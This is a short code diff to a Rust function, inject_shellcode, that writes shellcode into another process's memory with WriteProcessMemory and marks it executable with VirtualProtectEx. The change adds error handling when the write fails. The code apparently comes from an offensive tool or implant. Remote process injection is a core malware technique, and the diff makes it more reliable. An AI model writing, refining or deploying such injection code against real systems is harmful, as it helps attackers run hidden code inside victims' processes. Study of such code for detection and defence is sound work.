@@ -316,13 +316,17 @@ fn inject_shellcode(pid: u32, shellcode: &[u8]) -> String {
         }
 
         let mut written = 0usize;
-        let _ = WriteProcessMemory(
+        let wpm_ok = WriteProcessMemory(
             proc.0 as *mut winapi::ctypes::c_void,
             addr as *mut winapi::ctypes::c_void,
             shellcode.as_ptr() as *const winapi::ctypes::c_void,
             shellcode.len(),
             &mut written,
         );
+        if wpm_ok == 0 || written != shellcode.len() {
+            let _ = CloseHandle(proc);
+            return "[-] WriteProcessMemory failed".into();
+        }
 
         let mut old = PAGE_PROTECTION_FLAGS(0);
         let _ = VirtualProtectEx(proc, addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old);
